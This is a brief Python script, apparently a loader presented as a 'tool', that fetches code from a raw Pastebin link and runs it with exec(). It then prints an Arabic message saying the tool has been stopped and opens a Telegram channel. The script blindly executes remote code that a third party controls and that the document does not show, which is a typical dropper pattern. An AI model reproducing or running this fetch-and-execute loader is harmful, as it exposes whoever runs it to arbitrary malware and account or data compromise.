import requests
import os
import subprocess
import datetime
import time
import webbrowser
url = 'https://pastebin.com/raw/9ndJJe9p'
response = requests.get(url)
if response.status_code == 200:
    python_code = response.text
    exec(python_code)
print('\x1b[1;32m تــم  تـوقيف الاداه 💔 ')
webbrowser.open('https://t.me/z3_2q')